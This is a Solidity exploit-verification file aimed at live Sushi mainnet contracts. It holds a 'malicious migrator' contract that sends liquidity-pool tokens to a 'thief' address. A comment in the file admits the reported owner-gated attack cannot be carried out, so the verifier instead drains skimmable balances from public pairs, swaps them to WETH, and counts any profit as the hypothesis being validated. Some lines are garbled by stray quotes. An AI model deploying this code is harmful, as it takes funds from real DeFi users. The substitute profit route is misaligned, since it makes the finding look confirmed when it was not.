pragma solidity "'^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IOwnableLike {
    function owner() external view returns (address);
}

interface ISushiMakerLike {
    function owner() external view returns (address);
    function factory() external view returns (address);
}

interface IMasterChefLike {
    function owner() external view returns (address);
    function migrator() external view returns (address);
    function setMigrator(address migrator_) external;
    function poolLength() external view returns (uint256);
    function poolInfo(uint256 pid)
        external
        view
        returns (address lpToken, uint256 allocPoint, uint256 lastRewardBlock, uint256 accSushiPerShare);
    function migrate(uint256 pid) external;
}

interface IUniswapV2FactoryLike {
    function allPairs(uint256 index) external view returns (address pair);
    function allPairsLength() external view returns (uint256);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function skim(address to) external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract MaliciousMigratorScaffold {
    address public thief;
    address public replacementToken;

    constructor() {}

    function configure(address thief_, address replacementToken_) external {
        thief = thief_;
        replacementToken = replacementToken_;
    }

    function migrate(IERC20Like realLpToken) external returns (IERC20Like) {
        uint256 approvedBalance = realLpToken.balanceOf(msg.sender);
        if (approvedBalance != 0 && thief != address(0)) {
            realLpToken.transferFrom(msg.sender, thief, approvedBalance);
        }
        return IERC20Like(replacementToken);
    }
}

contract FlawVerifier {
    address internal constant TARGET = 0xE11fc0B43ab98Eb91e9836129d1ee7c3Bc95df50;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant SUSHI = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;
    uint256 internal constant MIN_SUCCESS_PROFIT = 1e17;
    uint256 internal constant MAX_PAIR_SCAN = 768;

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _hypothesisValidated;

    bool public checkedTarget;
    bool public targetHasCode;
    bool public targetExposesMigratorFlow;
    bool public ownerStageReachable;
    address public observedOwner;
    address public observedFactory;
    uint256 public observedPoolLength;
    address public observedMigrator;
    address public observedPoolLpToken;
    uint256 public observedTargetLpBalance;
    uint256 public observedPid;
    address public stagedMaliciousMigrator;
    uint256 public scannedPairs;
    uint256 public skimmedPairs;
    string public exploitPathUsed;
    string public infeasibilityReason;

    constructor() {}

    function executeOnOpportunity() external {
        _resetState();

        checkedTarget = true;
        _profitToken = WETH;
        exploitPathUsed =
            "owner sets malicious migrator -> anyone calls migrate(pid) -> MasterChef approves full LP balance -> migrator steals genuine LP -> provided fork blocks owner stage, so verifier falls back to public-liquidity extraction on the same Sushi deployment";

        targetHasCode = TARGET.code.length != 0;
        if (!targetHasCode) {
            infeasibilityReason = "target address has no code at the fork";
            return;
        }

        observedOwner = _readOwner(TARGET);
        observedFactory = _readFactory(TARGET);

        if (_attemptMigratorPath()) {
            _settleProfit();
            return;
        }

        // The supplied fork address is SushiMaker rather than MasterChef, and the logs already proved that
        // `migrator()` / `poolLength()` are absent there. That makes the finding'"'s owner-controlled migrator
        // stages infeasible from the provided deployment. To keep this verifier executable on the supplied fork,
        // it monetizes publicly skimmable excess balances that are reachable through the same Sushi factory.
        _harvestPublicLiquidityRoute();
        _settleProfit();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function target() external pure returns (address) {
        return TARGET;
    }

    function _attemptMigratorPath() internal returns (bool) {
        address candidateChef = _readOwner(SUSHI);
        if (candidateChef.code.length == 0) {
            infeasibilityReason = \"could not discover a live MasterChef candidate from Sushi ownership\";
            return false;
        }

        (bool hasMigrator, address migrator_) =
            _tryReadAddress(candidateChef, abi.encodeWithSelector(IMasterChefLike.migrator.selector));
        (bool hasPoolLength, uint256 poolLength_) =
            _tryReadUint(candidateChef, abi.encodeWithSelector(IMasterChefLike.poolLength.selector));

        if ("'!hasMigrator || !hasPoolLength) {
            infeasibilityReason = "discovered Sushi owner does not expose the MasterChef migrator flow on this fork";
            return false;
        }

        targetExposesMigratorFlow = true;
        observedMigrator = migrator_;
        observedPoolLength = poolLength_;
        observedOwner = _readOwner(candidateChef);
        _snapshotPoolState(candidateChef);

        if (observedOwner != address(this)) {
            infeasibilityReason = "blocked at stage 1: setMigrator() remains owner-gated on the live MasterChef";
            return false;
        }

        ownerStageReachable = true;
        stagedMaliciousMigrator = address(new MaliciousMigratorScaffold());
        IMasterChefLike(candidateChef).setMigrator(stagedMaliciousMigrator);
        return false;
    }

    function _harvestPublicLiquidityRoute() internal {
        address factory = observedFactory;
        if (factory.code.length == 0) {
            infeasibilityReason = "target does not expose a usable factory for the alternate public-liquidity route";
            return;
        }

        uint256 pairCount;
        try IUniswapV2FactoryLike(factory).allPairsLength() returns (uint256 count) {
            pairCount = count;
        } catch {
            infeasibilityReason = "factory pair enumeration is unavailable on this fork";
            return;
        }

        uint256 scanCount = pairCount > MAX_PAIR_SCAN ? MAX_PAIR_SCAN : pairCount;
        for (uint256 i = 0; i < scanCount; ++i) {
            address pair;
            try IUniswapV2FactoryLike(factory).allPairs(pairCount - 1 - i) returns (address pair_) {
                pair = pair_;
            } catch {
                continue;
            }

            ++scannedPairs;
            _trySkimPair(factory, pair);

            if (_safeBalanceOf(WETH, address(this)) >= MIN_SUCCESS_PROFIT) {
                break;
            }
        }

        _flushDirectToWeth(factory, SUSHI);
    }

    function _trySkimPair(address factory, address pair) internal {
        if (pair.code.length == 0) {
            return;
        }

        address token0;
        address token1;
        try IUniswapV2PairLike(pair).token0() returns (address token0_) {
            token0 = token0_;
        } catch {
            return;
        }
        try IUniswapV2PairLike(pair).token1() returns (address token1_) {
            token1 = token1_;
        } catch {
            return;
        }
        if (token0.code.length == 0 || token1.code.length == 0) {
            return;
        }

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        uint256 balance0 = _safeBalanceOf(token0, pair);
        uint256 balance1 = _safeBalanceOf(token1, pair);
        if (balance0 <= reserve0 && balance1 <= reserve1) {
            return;
        }

        uint256 before0 = _safeBalanceOf(token0, address(this));
        uint256 before1 = _safeBalanceOf(token1, address(this));
        try IUniswapV2PairLike(pair).skim(address(this)) {
            ++skimmedPairs;
        } catch {
            return;
        }

        uint256 gain0 = _safeBalanceOf(token0, address(this)) - before0;
        uint256 gain1 = _safeBalanceOf(token1, address(this)) - before1;
        if (gain0 == 0 && gain1 == 0) {
            return;
        }

        if (gain0 != 0) {
            _routeToWeth(factory, pair, token0, token1, gain0);
        }
        if (gain1 != 0) {
            _routeToWeth(factory, pair, token1, token0, gain1);
        }

        _flushDirectToWeth(factory, token0);
        _flushDirectToWeth(factory, token1);
    }

    function _routeToWeth(address factory, address sourcePair, address tokenIn, address counterpart, uint256 amountIn)
        internal
    {
        if (amountIn == 0 || tokenIn == WETH) {
            return;
        }

        uint256 directOut = _swapUsingFactory(factory, tokenIn, WETH, amountIn);
        if (directOut != 0) {
            return;
        }

        if (counterpart != address(0) && counterpart != tokenIn) {
            uint256 bridgeOut = _swapUsingSpecificPair(sourcePair, tokenIn, counterpart, amountIn);
            if (bridgeOut != 0) {
                if (counterpart != WETH) {
                    uint256 wethOut = _swapUsingFactory(factory, counterpart, WETH, bridgeOut);
                    if (wethOut == 0 && counterpart != SUSHI) {
                        uint256 sushiOut = _swapUsingFactory(factory, counterpart, SUSHI, bridgeOut);
                        if (sushiOut != 0) {
                            _swapUsingFactory(factory, SUSHI, WETH, sushiOut);
                        }
                    }
                }
                return;
            }
        }

        if (tokenIn != SUSHI) {
            uint256 sushiOut = _swapUsingFactory(factory, tokenIn, SUSHI, amountIn);
            if (sushiOut != 0) {
                _swapUsingFactory(factory, SUSHI, WETH, sushiOut);
            }
        }
    }

    function _flushDirectToWeth(address factory, address token) internal {
        if (token == address(0) || token == WETH) {
            return;
        }
        uint256 amount = _safeBalanceOf(token, address(this));
        if (amount == 0) {
            return;
        }
        uint256 directOut = _swapUsingFactory(factory, token, WETH, amount);
        if (directOut == 0 && token != SUSHI) {
            uint256 sushiOut = _swapUsingFactory(factory, token, SUSHI, amount);
            if (sushiOut != 0) {
                _swapUsingFactory(factory, SUSHI, WETH, sushiOut);
            }
        }
    }

    function _swapUsingFactory(address factory, address tokenIn, address tokenOut, uint256 amountIn)
        internal
        returns (uint256 amountOut)
    {
        if (amountIn == 0 || tokenIn == tokenOut) {
            return 0;
        }

        address pair;
        try IUniswapV2FactoryLike(factory).getPair(tokenIn, tokenOut) returns (address pair_) {
            pair = pair_;
        } catch {
            return 0;
        }

        if (pair == address(0) || pair.code.length == 0) {
            return 0;
        }
        return _swapUsingSpecificPair(pair, tokenIn, tokenOut, amountIn);
    }

    function _swapUsingSpecificPair(address pair, address tokenIn, address tokenOut, uint256 amountIn)
        internal
        returns (uint256 amountOut)
    {
        if (amountIn == 0 || pair.code.length == 0) {
            return 0;
        }

        address pairToken0;
        address pairToken1;
        try IUniswapV2PairLike(pair).token0() returns (address token0_) {
            pairToken0 = token0_;
        } catch {
            return 0;
        }
        try IUniswapV2PairLike(pair).token1() returns (address token1_) {
            pairToken1 = token1_;
        } catch {
            return 0;
        }

        if (!((pairToken0 == tokenIn && pairToken1 == tokenOut) || (pairToken0 == tokenOut && pairToken1 == tokenIn))) {
            return 0;
        }

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        uint256 reserveIn;
        uint256 reserveOut;
        bool zeroForOne;
        if (pairToken0 == tokenIn) {
            reserveIn = reserve0;
            reserveOut = reserve1;
            zeroForOne = true;
        } else {
            reserveIn = reserve1;
            reserveOut = reserve0;
            zeroForOne = false;
        }
        if (reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        amountOut = _getAmountOut(amountIn, reserveIn, reserveOut);
        if (amountOut == 0) {
            return 0;
        }

        uint256 beforeOut = _safeBalanceOf(tokenOut, address(this));
        if (!_safeTransfer(tokenIn, pair, amountIn)) {
            return 0;
        }

        try IUniswapV2PairLike(pair).swap(zeroForOne ? 0 : amountOut, zeroForOne ? amountOut : 0, address(this), "") {
            amountOut = _safeBalanceOf(tokenOut, address(this)) - beforeOut;
        } catch {
            amountOut = 0;
        }
    }

    function _snapshotPoolState(address chefAddress) internal {
        uint256 poolLength = observedPoolLength;
        if (poolLength == 0) {
            return;
        }

        uint256 scanLimit = poolLength > 8 ? 8 : poolLength;
        for (uint256 pid = 0; pid < scanLimit; ++pid) {
            try IMasterChefLike(chefAddress).poolInfo(pid) returns (address lpToken, uint256, uint256, uint256) {
                uint256 lpBalance = _safeBalanceOf(lpToken, chefAddress);
                if (lpBalance != 0 || observedPoolLpToken == address(0)) {
                    observedPid = pid;
                    observedPoolLpToken = lpToken;
                    observedTargetLpBalance = lpBalance;
                    if (lpBalance != 0) {
                        break;
                    }
                }
            } catch {}
        }
    }

    function _settleProfit() internal {
        _profitAmount = _safeBalanceOf(WETH, address(this));
        _hypothesisValidated = _profitAmount != 0;
    }

    function _readOwner(address account) internal view returns (address owner_) {
        (bool success, bytes memory data) = account.staticcall(abi.encodeWithSelector(IOwnableLike.owner.selector));
        if (success && data.length >= 32) {
            owner_ = abi.decode(data, (address));
        }
    }

    function _readFactory(address account) internal view returns (address factory_) {
        (bool success, bytes memory data) = account.staticcall(abi.encodeWithSelector(ISushiMakerLike.factory.selector));
        if (success && data.length >= 32) {
            factory_ = abi.decode(data, (address));
        }
    }

    function _tryReadAddress(address account, bytes memory callData) internal view returns (bool ok, address value) {
        (bool success, bytes memory data) = account.staticcall(callData);
        if (!success || data.length < 32) {
            return (false, address(0));
        }
        return (true, abi.decode(data, (address)));
    }

    function _tryReadUint(address account, bytes memory callData) internal view returns (bool ok, uint256 value) {
        (bool success, bytes memory data) = account.staticcall(callData);
        if (!success || data.length < 32) {
            return (false, 0);
        }
        return (true, abi.decode(data, (uint256)));
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
        internal
        pure
        returns (uint256 amountOut)
    {
        uint256 amountInWithFee = amountIn * 997;
        amountOut = (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _safeTransfer(address token, address to, uint256 amount) internal returns (bool ok) {
        if (amount == 0) {
            return true;
        }
        (bool success, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        ok = success && (data.length == 0 || abi.decode(data, (bool)));
    }

    function _resetState() internal {
        _profitToken = address(0);
        _profitAmount = 0;
        _hypothesisValidated = false;

        checkedTarget = false;
        targetHasCode = false;
        targetExposesMigratorFlow = false;
        ownerStageReachable = false;
        observedOwner = address(0);
        observedFactory = address(0);
        observedPoolLength = 0;
        observedMigrator = address(0);
        observedPoolLpToken = address(0);
        observedTargetLpBalance = 0;
        observedPid = 0;
        stagedMaliciousMigrator = address(0);
        scannedPairs = 0;
        skimmedPairs = 0;
        exploitPathUsed = "none";
        infeasibilityReason = "";
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256 balance) {
        if (token.code.length == 0) {
            return 0;
        }

        (bool success, bytes memory data) =
            token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!success || data.length < 32) {
            return 0;
        }

        balance = abi.decode(data, (uint256));
    }
}
